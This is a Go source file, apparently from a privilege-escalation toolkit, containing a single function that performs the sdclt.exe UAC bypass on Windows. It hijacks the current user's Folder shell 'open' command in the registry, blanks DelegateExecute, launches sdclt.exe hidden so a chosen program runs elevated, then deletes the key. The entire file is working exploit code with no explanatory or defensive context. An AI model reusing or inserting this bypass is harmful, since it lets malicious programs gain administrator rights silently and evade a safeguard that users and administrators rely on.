// Copyright (c) 2019-2022 0x9ef. All rights reserved.
// Use of this source code is governed by an MIT license
// that can be found in the LICENSE file.
package once

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
	"time"

	"golang.org/x/sys/windows/registry"
)

func ExecSdcltcontrol(path string) error {
	k, exists, err := registry.CreateKey(registry.CURRENT_USER,
		"Software\\Classes\\Folder\\shell\\open\\command", registry.ALL_ACCESS)
	if err != nil && !exists {
		return err
	}

	defer k.Close()
	defer registry.DeleteKey(registry.CURRENT_USER, "Software\\Classes\\Folder\\shell\\open\\command")
	cmdDir := filepath.Join(os.Getenv("SYSTEMROOT"), "system32", "cmd.exe")
	value := fmt.Sprintf("%s start /k %s", cmdDir, path)
	if err = k.SetStringValue("", value); err != nil {
		return err
	}
	if err = k.SetStringValue("DelegateExecute", ""); err != nil {
		return err
	}

	time.Sleep(time.Second)
	e := exec.Command("sdclt.exe")
	e.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	err = e.Run()
	return err
}
